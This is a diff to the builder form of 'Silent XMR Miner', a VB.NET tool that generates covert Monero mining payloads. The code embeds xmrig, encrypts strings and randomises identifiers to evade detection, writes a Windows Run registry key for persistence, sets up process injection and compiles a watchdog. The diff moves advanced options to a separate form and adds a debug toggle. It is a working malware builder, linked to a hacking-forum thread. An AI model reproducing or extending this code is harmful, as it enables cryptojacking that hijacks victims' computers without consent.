@@ -4,28 +4,28 @@ Imports System.Text
 
 Public Class Form1
     Public Shared rand As New Random()
-    Public advancedParams As String = "--coin=monero --asm=auto --cpu-memory-pool=-1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
+    Public advancedParams As String = "--coin=monero --asm=auto --cpu-memory-pool=1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
     Public watchdogdata As Byte() = New Byte() {}
+    Public FA As New Advanced
 
     'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
         Font = New Font(Font.Name, 8.25F * 100.0F / CreateGraphics().DpiY, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)
+        FA.Font = New Font(Font.Name, 8.25F * 100.0F / CreateGraphics().DpiY, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)
 
         CheckForIllegalCrossThreadCalls = False
         Codedom.F = Me
+        FA.F = Me
 
+
+        FA.txtAdvParam.Text = advancedParams
         BackgroundWorker1.RunWorkerAsync()
     End Sub
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent XMR Miner Builder 1.1"
-        Catch ex As Exception
-        End Try
-
-        Try
-            txtAdvParam.Text = advancedParams
+            MephForm1.Text = "Silent XMR Miner Builder 1.2"
         Catch ex As Exception
         End Try
 
@@ -87,7 +87,7 @@ Public Class Form1
             txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
             txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
             Dim minerbuilder As New StringBuilder(MinerSource)
-            Dim argstr As String = " -B " & If(chkAdvanced.Checked, txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & " --donate-level=5 "
+            Dim argstr As String = " -B " & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & " --donate-level=5 "
 
             minerbuilder.Replace("#dll", Resources_dll)
             minerbuilder.Replace("#xmr", Resources_xmrig)
@@ -100,11 +100,11 @@ Public Class Form1
             minerbuilder.Replace("#SALT", SALT)
             minerbuilder.Replace("#IV", IV)
             minerbuilder.Replace("#LIBSPATH", EncryptString("Microsoft\Libs\"))
-            minerbuilder.Replace("#DLLSTR", EncryptString("Project1.Program"))
+            minerbuilder.Replace("#DLLSTR", EncryptString("Mandark.Mandark"))
             minerbuilder.Replace("#DLLOAD", EncryptString("Load"))
             minerbuilder.Replace("#REGKEY", EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
             minerbuilder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
-            minerbuilder.Replace("#InjectionDir", EncryptString(InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows))))
+            minerbuilder.Replace("#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))
 
             minerbuilder.Replace("RInstall", Randomi(rand.Next(5, 40)))
             minerbuilder.Replace("RGetTheResource", Randomi(rand.Next(5, 40)))
@@ -115,6 +115,11 @@ Public Class Form1
             minerbuilder.Replace("RInitialize", Randomi(rand.Next(5, 40)))
             minerbuilder.Replace("RGetGPU", Randomi(rand.Next(5, 40)))
             minerbuilder.Replace("RAES_Decryptor", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RTruncate", Randomi(rand.Next(5, 40)))
+
+            If FA.toggleEnableDebug.Checked Then
+                minerbuilder.Replace("DefDebug", "true")
+            End If
 
             If toggleEnableIdle.Checked Then
                 argstr += " --unam-idle-wait=" & txtIdleWait.Text & " --unam-idle-cpu=" & txtIdleCPU.Text.Replace("%", "") & " "
@@ -172,12 +177,15 @@ Public Class Form1
 
                     WatchdogSource = watchdogbuilder.ToString()
 
-                    Codedom.WatchdogCompiler(OutputPayload & "-watchdog", WatchdogSource)
+                    Codedom.WatchdogCompiler(Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog.exe", WatchdogSource)
 
                     If Codedom.WatchdogOK Then
                         txtLog.Text = txtLog.Text + ("Compiled Watchdog!" + vbNewLine)
-                        watchdogdata = File.ReadAllBytes(OutputPayload & "-watchdog")
-                        File.Delete(OutputPayload & "-watchdog")
+                        If FA.toggleCustomWatchdog.Checked Then
+                            MessageBox.Show("Watchdog has been compiled and can be found in the same folder as the chosen miner path. Press OK after you're done with the Watchdog.")
+                        End If
+                        watchdogdata = File.ReadAllBytes(Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog.exe")
+                        File.Delete(Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog.exe")
                     Else
                         txtLog.Text = txtLog.Text + ("Error compiling Watchdog!" + vbNewLine)
                     End If
@@ -445,16 +453,6 @@ Public Class Form1
         Process.Start("https://hackforums.net/showthread.php?tid=5995773")
     End Sub
 
-    Private Sub chkAdvanced_CheckedChanged(sender As Object) Handles chkAdvanced.CheckedChanged
-        If chkAdvanced.Checked Then
-            chkAdvanced.Text = "Enabled"
-            txtAdvParam.Enabled = True
-        Else
-            chkAdvanced.Text = "Disabled"
-            txtAdvParam.Enabled = False
-        End If
-    End Sub
-
     Private Sub toggleEnableIdle_CheckedChanged(sender As Object) Handles toggleEnableIdle.CheckedChanged
         If toggleEnableIdle.Checked Then
             txtIdleCPU.Enabled = True
@@ -465,4 +463,7 @@ Public Class Form1
         End If
     End Sub
 
+    Private Sub MephButton1_Click(sender As Object, e As EventArgs) Handles MephButton1.Click
+        FA.Show()
+    End Sub
 End Class
